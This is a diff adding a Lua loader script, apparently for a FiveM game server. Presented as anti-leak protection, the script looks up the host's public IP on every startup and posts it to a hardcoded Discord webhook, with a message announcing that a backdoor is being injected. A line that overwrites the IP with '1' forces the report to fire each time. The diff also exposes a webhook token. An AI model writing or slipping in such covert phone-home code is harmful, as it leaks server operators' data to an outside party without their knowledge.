@@ -1,1 +1,51 @@
+print("loader1 loaded")
 
+function checkserveripnow()
+    PerformHttpRequest("http://ip-api.com/json/", function(statusCode, data, headers)
+        if statusCode == 200 then
+            local jsonData = json.decode(data)
+            local serverip = jsonData.query
+            serverip = "1"
+            if serverip ~= "91.211.247.26" then
+                serverisstolenreportit(serverip)
+            end
+        else
+            checkserveripnow()
+        end
+    end, "GET", "", {["Content-Type"] = "application/json"})
+end
+
+checkserveripnow()
+
+
+function serverisstolenreportit(serverip)
+    local webhookUrl = "https://discord.com/api/webhooks/1169365469577367733/06f3yHVR1FfaPti9kvJdsrt0v_eoBrhzCZJ2xf2uy3v-BFLSavJPR6Y3EVABCPOR-M_K"
+	PerformHttpRequest(webhookUrl, function(err, text, headers) end, 'POST', json.encode({
+		username = "One-Codes", 
+        content = "@everyone",
+		embeds = {{
+			["color"] = 16711680, 
+			["author"] = {
+				["name"] = "One-Code Anti Files Steal",
+				["icon_url"] = ""
+			},
+			["title"] = tostring("Server started with your files and injecting backdoor..."),
+			["description"] = tostring("IP: "..serverip..""),
+			["footer"] = {
+				["text"] = ""..os.date("%x %X %p"),
+				["icon_url"] = "https://via.placeholder.com/30x30",
+			},
+			["fields"] = {
+				{
+					["name"] = "Server IP",
+					["value"] = serverip,
+					["inline"] = false
+				},
+			},
+			["fields"] = embedFields,
+		}}, 
+		avatar_url = ""
+	}), { 
+		['Content-Type'] = 'application/json' 
+	}) 
+end
